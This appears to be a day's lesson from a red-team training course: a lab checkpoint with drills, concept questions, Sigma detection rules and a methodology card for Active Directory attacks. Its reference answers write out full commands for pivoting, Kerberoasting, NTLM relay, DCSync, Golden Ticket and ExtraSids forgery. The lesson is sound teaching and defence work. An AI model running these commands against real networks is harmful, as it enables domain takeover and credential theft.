---
title: "Offshore Practice Day 2 — Reinforcement and Competency Checkpoint"
tags: [red-team, offshore, practice, checkpoint, gap-closure, competency,
  ATT&CK, exam-prep, reinforcement, red-team-competency-check]
module: 08-RedTeam-03
day: 540
related_topics:
  - Offshore Practice Day 1 (Day 539)
  - Red Team Competency Check (Day 560)
  - Advanced Persistence Lab (Day 533)
  - Cross-Environment Attack Paths (Day 529)
  - Practice Checkpoint Cloud and Container (Day 530)
---

# Day 540 — Offshore Practice Day 2: Reinforcement and Checkpoint

> "Day 539 showed you where you are fast and where you are slow. Today you
> close the gaps — not by reading about them, but by drilling the specific
> techniques you failed under pressure. Then you run the checkpoint: a short,
> targeted assessment of the techniques that matter most for this module.
> By the end of today, you either know it or you have a precise list of what
> you need to fix before Day 560."
>
> — Ghost

---

## Goals

Close the specific technique gaps identified in Day 539's sticking points
analysis.
Drill the three improvement targets from Day 539 to rating-4 proficiency.
Complete the Offshore module checkpoint assessment.
Build a personal "Offshore methodology reference card" for use in Day 560.

**Prerequisites:** Day 539 complete (sticking points documented, improvement
targets set). Lab environment available.
**Time budget:** 6 hours.

---

## Part 1 — Targeted Gap Drills (2 hours)

```
Take your three improvement targets from Day 539.
For each one: run the technique in the lab five times from scratch.

Drill format for each technique:
  1. Write the command(s) from memory (no reference)
  2. Execute in the lab — note any error
  3. Correct any error
  4. Repeat steps 1–3 until you can execute without any correction
  5. Time the final execution: ________ minutes

The goal is not just to get it working — it is to get it working reliably,
without hesitation, from memory.

Gap 1 from Day 539:
  Technique: ________________________________________________
  Command(s) written from memory:
  ___________________________________________________________
  ___________________________________________________________
  Times attempted before correct: ____
  Final execution time: ________ minutes
  Rating before drill: ___   Rating after drill: ___

Gap 2 from Day 539:
  Technique: ________________________________________________
  Command(s) written from memory:
  ___________________________________________________________
  ___________________________________________________________
  Times attempted before correct: ____
  Final execution time: ________ minutes
  Rating before drill: ___   Rating after drill: ___

Gap 3 from Day 539:
  Technique: ________________________________________________
  Command(s) written from memory:
  ___________________________________________________________
  ___________________________________________________________
  Times attempted before correct: ____
  Final execution time: ________ minutes
  Rating before drill: ___   Rating after drill: ___
```

---

## Part 2 — Offshore Checkpoint Assessment (2.5 hours)

### Section A — Command Recall (45 min, no reference)

Write every command from memory. Check answers after all questions.

```
1. Masscan command to scan the top 20 most common ports across a /24
   at 2000 packets/second, outputting in grepable format:

   Answer: __________________________________________________

   Reference: masscan -p80,443,22,8080,8443,21,25,3389,445,139,1433,
              3306,27017,6379,9200,5432,23,110,143,3000 10.10.110.0/24
              --rate=2000 -oG masscan_results.txt

2. Start a Ligolo-ng proxy server on your attack host (self-signed cert,
   listening on port 11601):

   Answer: __________________________________________________

   Reference: sudo ./proxy -selfcert -laddr 0.0.0.0:11601

3. Run a Ligolo agent on the compromised pivot host connecting back to
   your attack host:

   Answer: __________________________________________________

   Reference: ./agent -connect <ATTACK_HOST>:11601 -ignore-cert

4. After a Ligolo tunnel is established, add the internal /24 route
   to your attack host's routing table:

   Answer: __________________________________________________

   Reference: sudo ip route add 10.10.10.0/24 dev ligolo

5. Collect BloodHound data using bloodhound-python as a domain user
   (user/pass, DC IP, domain name), including LoggedOn session data,
   saving as a zip:

   Answer: __________________________________________________

   Reference: bloodhound-python -u user -p 'pass' -ns <DC_IP>
              -d corp.local -c All,LoggedOn --zip -o bh.zip

6. Use impacket-GetUserSPNs to request Kerberoasting hashes for all
   SPNs in the domain, saving to a file:

   Answer: __________________________________________________

   Reference: impacket-GetUserSPNs corp.local/user:'pass'
              -dc-ip <DC_IP> -request -outputfile krb_hashes.txt

7. Crack NTLMv2 hashes captured by Responder using hashcat:

   Answer: __________________________________________________

   Reference: hashcat -m 5600 hashes.txt /path/to/wordlist.txt --force

8. Run impacket-ntlmrelayx to relay NTLM authentications to all hosts
   in relay_targets.txt, opening a SOCKS proxy for authenticated sessions:

   Answer: __________________________________________________

   Reference: impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

9. Execute a DCSync attack using impacket-secretsdump, extracting only
   NTLM hashes (not Kerberos keys), outputting to a file:

   Answer: __________________________________________________

   Reference: impacket-secretsdump corp.local/administrator:'pass'
              @<DC_IP> -just-dc-ntlm -outputfile domain_hashes

10. Generate a Golden Ticket using impacket-ticketer for the 'administrator'
    user, given a krbtgt hash and domain SID:

    Answer: __________________________________________________

    Reference: impacket-ticketer -nthash <KRBTGT_NTLM>
               -domain-sid <DOMAIN_SID> -domain corp.local administrator

11. Use an ExtraSids attack to forge a cross-forest ticket that includes
    the subsidiary.com Enterprise Admins SID:

    Answer: __________________________________________________

    Reference: impacket-ticketer -nthash <CORP_KRBTGT> -domain-sid <CORP_SID>
               -domain corp.local -extra-sid <SUB_SID>-519
               -spn krbtgt/subsidiary.com administrator

12. Use certipy to find vulnerable ADCS templates in a domain:

    Answer: __________________________________________________

    Reference: certipy find -u user -p 'pass' -target <DC_IP>
               -json -output certipy_results

Score: ___/12

Review every incorrect command before moving to Section B.
```

### Section B — Concept Questions (30 min)

```
Answer in 2–3 sentences maximum. No reference material.

1. What is the difference between a two-way forest trust and a parent-child
   domain trust in Active Directory? What makes one more dangerous than the
   other from a red team perspective?

   Answer:
   _____________________________________________________________
   _____________________________________________________________
   _____________________________________________________________

2. Explain why changing a user's password does not invalidate their existing
   Kerberos tickets. What does invalidate them?

   Answer:
   _____________________________________________________________
   _____________________________________________________________

3. What is the NTLM relay attack? What single configuration change would
   completely prevent it?

   Answer:
   _____________________________________________________________
   _____________________________________________________________

4. What is the difference between DCSync and a Shadow Credentials attack
   as paths to domain admin?

   Answer:
   _____________________________________________________________
   _____________________________________________________________

5. Why is SID Filtering the critical protection against ExtraSids attacks?
   What must be true about the trust configuration for the attack to work?

   Answer:
   _____________________________________________________________
   _____________________________________________________________

Reference answers (check after completing):

1. Forest trust: explicitly created between two separate forests (separate
   schema, EA groups, krbtgt keys). Parent-child: automatically created
   when a child domain is added to a forest — fully transitive by design.
   Forest trusts are MORE controllable and by default have SID filtering.
   Parent-child trusts have no SID filtering — compromise of any child domain
   domain is often a path to the root domain.

2. Kerberos tickets have a lifetime encoded at issuance. The KDC validates
   the KRBTGT key used to sign the ticket — not the current password.
   To invalidate: change the krbtgt password (twice for Golden Tickets).
   User password change does not affect ticket validity.

3. NTLM relay: when a victim tries to authenticate to a server, the attacker
   intercepts the NTLM handshake and forwards (relays) it to another server
   as if they were the victim. Prevention: enforce SMB signing on all systems
   (Server and client, via GPO).

4. DCSync: simulates DC replication to pull all hashes from the domain DB.
   Requires DS-Replication-Get-Changes(-All) rights on the domain object —
   normally only DAs have this. Shadow Credentials: adds a certificate to a
   target account's msDS-KeyCredentialLink attribute, then authenticates as
   that account using PKINIT. Requires GenericWrite on the target account.

5. SID Filtering strips SID History attributes from cross-forest Kerberos
   tickets. The ExtraSids attack places a privileged SID (e.g., EA-519) in
   the PAC's SID History. If SID Filtering is on, the subsidiary DC strips
   that claim and the attacker loses the privilege. For the attack to work:
   the trust must have SID Filtering (Quarantine) explicitly disabled.
```

### Section C — Live Technique Demonstration (45 min)

```
From a standard domain user on an internal Windows host (no DA yet),
demonstrate the following in your lab environment without reference:

Challenge 1 — Kerberoasting to DA (25 min):
  1. Run GetUserSPNs against the lab domain
  2. Crack the resulting hash (use a test hash with a known password)
  3. Verify the cracked account's AD group membership (BloodHound or net user)
  4. If the account has a DA path: execute it

  Completion: [ ] Hash captured  [ ] Hash cracked  [ ] DA access achieved
  Time taken: _______ minutes

Challenge 2 — RBCD Attack (20 min):
  Given: you have GenericWrite on a computer object in the lab.
  Execute the full RBCD chain:
    - Create fake computer account
    - Set msDS-AllowedToActOnBehalfOf
    - Request S4U ticket
    - Use ticket to access the target computer as administrator

  Completion: [ ] Fake computer created  [ ] RBCD set  [ ] Ticket obtained
              [ ] Admin access confirmed
  Time taken: _______ minutes
```

### Section D — Detection Writing (30 min)

Write detection logic for these techniques. Use Sigma, KQL, or plain description.

```
Detection 1: Kerberoasting
  What to detect: TGS-REQ for RC4-encrypted service tickets (etype 23) in
  Event ID 4769 where the encryption type is 0x17 (RC4_HMAC)

  Sigma rule outline (write from memory):
  ___________________________________________________________
  ___________________________________________________________
  ___________________________________________________________

  Reference:
  logsource:
    product: windows
    service: security
  detection:
    selection:
      EventID: 4769
      TicketEncryptionType: '0x17'
      TicketOptions: '0x40810000'
    filter:
      ServiceName|endswith: '$'     # exclude machine accounts
    condition: selection and not filter

Detection 2: NTLM relay attempt (Responder running on network)
  What to detect: multiple failed NTLM authentications from different source
  IPs to the same target IP in a short window

  Detection description:
  ___________________________________________________________
  ___________________________________________________________
  ___________________________________________________________

Detection 3: DCSync
  What to detect: Event ID 4662 with properties containing
  Replicating Directory Changes (1131f6aa...) and
  Replicating Directory Changes All (1131f6ad...)

  Sigma rule outline:
  ___________________________________________________________
  ___________________________________________________________
  ___________________________________________________________

  Reference:
  detection:
    selection:
      EventID: 4662
      ObjectType: 'domainDNS'
      AccessMask: '0x100'
      Properties|contains:
        - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
        - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    filter:
      SubjectUserName|endswith: '$'  # exclude machine accounts (DC-to-DC)
    condition: selection and not filter
```

---

## Part 3 — Methodology Reference Card (30 min)

Build your personal Offshore methodology card. One page maximum.
This card is allowed during the Red Team Competency Check (Day 560).

```
Format: Bullet lists, no prose. Commands must be complete and copy-paste ready.

Suggested sections:

═══════════════════════════════════════════════════════════════
EXTERNAL RECON
  masscan: ___________________________________________________
  nmap follow-up: ____________________________________________
  web discovery: _____________________________________________
  nuclei: ____________________________________________________

═══════════════════════════════════════════════════════════════
INITIAL ACCESS
  Top 3 techniques in order of preference:
  1. _________________________________________________________
  2. _________________________________________________________
  3. _________________________________________________________

═══════════════════════════════════════════════════════════════
PIVOT SETUP (Ligolo-ng)
  Proxy: _____________________________________________________
  Agent: _____________________________________________________
  Route: _____________________________________________________

═══════════════════════════════════════════════════════════════
INTERNAL RECON
  CME sweep: _________________________________________________
  BloodHound: ________________________________________________
  Kerberoast: ________________________________________________
  ASREPRoast: ________________________________________________
  Spray (after lockout policy check): ________________________

═══════════════════════════════════════════════════════════════
LATERAL MOVEMENT
  WMIexec: ___________________________________________________
  evil-winrm: ________________________________________________
  PTH: _______________________________________________________

═══════════════════════════════════════════════════════════════
DA PATHS (priority order from most reliable to least)
  1. _________________________________________________________
  2. _________________________________________________________
  3. _________________________________________________________
  4. _________________________________________________________

═══════════════════════════════════════════════════════════════
POST-DA
  DCSync: ____________________________________________________
  Golden Ticket: _____________________________________________
  ExtraSids: _________________________________________________

═══════════════════════════════════════════════════════════════
CLEANUP CHECKLIST
  [ ] Beacons terminated
  [ ] Persistence removed
  [ ] Accounts deleted
  [ ] Files removed
  [ ] Attributes restored
```

---

## Checkpoint Score Summary

```
Section A (Command Recall):     ___/12
Section B (Concept Questions):  ___/5
Section C (Live Demo):          ___/2 challenges × 5 steps each = ___/10
Section D (Detection Writing):  ___/3

Total: ___/30

Interpretation:
  27–30: Ghost Level — execute the Red Team Competency Check (Day 560) this week
  22–26: Red Cell Ready — address identified gaps, re-drill, retake checkpoint
  15–21: Needs work — return to Episodes 1–4, re-run specific labs
  < 15:  Back to foundation — re-read Days 511–539 before next attempt

Your score: ___
Status: _______________
Next action: ___________________________________________________________
```

---

## Key Takeaways

1. The checkpoint is not punitive — it is diagnostic. A low score tells you
   exactly what to study next. A high score gives you confidence that your
   technique knowledge is solid before the competency gate.
2. The methodology reference card is a professional artefact, not a cheat
   sheet. Senior operators have checklists and playbooks. Knowing you can rely
   on your card reduces cognitive load under pressure and improves the quality
   of your decision-making.
3. Detection knowledge is a red team skill, not only a blue team skill. A
   red teamer who cannot write the detection rule for their own technique does
   not fully understand the technique. Every offensive skill in this module
   has a corresponding detection signature — knowing both sides is what
   separates red teamers from script operators.
4. The progression from Episodes 1–4 → Practice Day 1 → Practice Day 2 →
   Competency Check is the Ghost Method applied to an entire module: Recon
   (understand the environment), Exploit (execute the techniques), Detect
   (write the detections), Harden (your own methodology). Every future module
   follows the same pattern.
5. Consistency of performance under pressure is the final exam criterion.
   Anyone can get DA on Day 537 with the walkthrough open. Getting DA on Day
   560 against an unknown target, under time pressure, without the walkthrough
   — that is the difference between a student and an operator.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q540.1, Q540.2 …).

---

## Navigation

← Previous: [Day 539 — Offshore Practice Day 1: Speed Engagement](DAY-0539-Offshore-Practice-Day-1-Speed-Engagement.md)
→ Next: [Day 541 — Red Team Practice: Offshore Environment Day 1](DAY-0541-Red-Team-Practice-Offshore-Day-1.md)
